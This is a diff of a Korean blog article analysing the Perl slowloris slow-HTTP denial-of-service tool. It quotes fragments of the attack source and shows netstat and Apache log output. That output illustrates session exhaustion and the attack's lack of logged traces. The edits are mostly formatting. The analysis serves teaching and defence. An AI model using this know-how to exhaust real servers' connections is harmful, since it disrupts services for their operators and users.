@@ -33,12 +33,11 @@ Fire Sale은 국가 전체 구조에 대한 체계화된 3단계 공격입니다
 하지만 RUDY는 패턴이 없기 때문에 사실상 막거나 눈치채기 어렵습니다.
 가장 큰 차이점은 트래픽이 비정상으로 많아지는 것이 아니라 서서히
 세션을 늘려감으로써 서버의 리소스를 서서히 좀 먹는 것입니다.
-결국 max session이 되면 서버는 die 상태가 됩니다.
+결국 세션이 넘치게 되면 서버는 die 상태가 됩니다.
 
 서론이 너무 길었습니다.
 이제 RUDY 공격 중 Perl로 짜여진 slowloris 공격 소스를 보고
 관리자의 시점이 아니라 순수한? 마음으로 분석을 진행해보겠습니다.
-
 본론으로 들어가기전 slowloris의 특징을 보겠습니다.
 
 - HTTP GET 기반 Flooding입니다.
@@ -94,7 +93,7 @@ netstat로 보는 서버의 상태입니다.
 아래와 같이 하나의 세션이 ESTABLISHED 상태 입니다.
 
     #!bash
-    [root@centos63 ~]# netstat -atn
+    [root@centos63 ~]$ netstat -atn
     Active Internet connections (servers and established)
     Proto Recv-Q Send-Q Local Address     Foreign Address      State     
     tcp        0      0 0.0.0.0:111       0.0.0.0:*            LISTEN     
@@ -242,7 +241,7 @@ Slowloris가 실핼될 때 서버 세션의 변화 모습입니다.
 정상적인 SYN을 받음으로 서버는 ESTABLISHED 상태로 연결을 맺고
 
     #!bash
-    [root@centos63 ~]# netstat -atn
+    [root@centos63 ~]$ netstat -atn
     Active Internet connections (servers and established)
     Proto Recv-Q Send-Q Local Address               Foreign Address             State     
     tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN     
@@ -267,7 +266,7 @@ Slowloris가 실핼될 때 서버 세션의 변화 모습입니다.
 SYN\_RECV 상태로 빠진후 FIN\_WAIT 상태로 바뀌게 됩니다.
 
     #!bash
-    [root@centos63 ~]# netstat -atn
+    [root@centos63 ~]$ netstat -atn
     Active Internet connections (servers and established)
     Proto Recv-Q Send-Q Local Address     Foreign Address      State     
     tcp        0      0 0.0.0.0:111       0.0.0.0:*            LISTEN     
@@ -291,21 +290,21 @@ SYN\_RECV 상태로 빠진후 FIN\_WAIT 상태로 바뀌게 됩니다.
 관리자가 눈치채지 못하게 말이죠.
 
     #!bash
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     173
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     177
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     202
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     232
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     449
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     647
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     639
-    [root@centos63 ~]# netstat -atn |wc -l
+    [root@centos63 ~]$ netstat -atn |wc -l
     475
 
 다시 코드로 돌아가겠습니다.
@@ -348,9 +347,6 @@ SSL과 INET의 경우를 구분하였습니다.
 이번에는 세션수를 정의하고 브라우저의 정보를 GET 합니다.
 정상적인 SYN 패킷을 보내기 위한 부분입니다.
 
-![정상적인 SYN 패킷][img-resize-4]
-*그림 4.* 정상적인 SYN 패킷 ([원본][img-4])
-
     #!perl
     # if ($working) {
         # 위에서 계속..
@@ -378,6 +374,11 @@ SSL과 INET의 경우를 구분하였습니다.
         print "Is something wrong?\nDying.\n";
         exit;
     }
+
+Wireshark로 보면 아래와 같습니다.
+
+![정상적인 SYN 패킷][img-resize-4]
+*그림 4.* 정상적인 SYN 패킷 ([원본][img-4])
 
 소켓을 생성한 후 그 소켓은 SLEEP 상태에 빠지며 서버측의 응답을 기다리게 됩니다.
 클라이언트는 마지막 `0d0a`를 보내지 않습니다.
@@ -446,12 +447,12 @@ SSL과 INET의 경우를 구분하였습니다.
         }
         if ( $delay < 166 ) {
             print <<EOSUCKS2BU;
-Since the timeout ended up being so small ($delay seconds) and it generally
-takes between 200-500 threads for most servers and assuming any latency at
-all...  you might have trouble using Slowloris against this target.  You can
-tweak the -timeout flag down to less than 10 seconds but it still may not
-build the sockets in time.
-EOSUCKS2BU
+    Since the timeout ended up being so small ($delay seconds) and it generally
+    takes between 200-500 threads for most servers and assuming any latency at
+    all...  you might have trouble using Slowloris against this target.  You can
+    tweak the -timeout flag down to less than 10 seconds but it still may not
+    build the sockets in time.
+    EOSUCKS2BU
         }
     }
 
@@ -489,7 +490,7 @@ EOSUCKS2BU
 아래는 공격을 시도하고 있지만 로그가 남지 않는 모습입니다.
 
     #!bash
-    [root@centos63 httpd]# tail -f access_log
+    [root@centos63 httpd]$ tail -f access_log
     ::1 - - [16/Dec/2012:05:21:01 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
     ::1 - - [16/Dec/2012:05:21:02 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
     ::1 - - [16/Dec/2012:05:21:03 -0500] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.2.15 (CentOS) (internal dummy connection)"
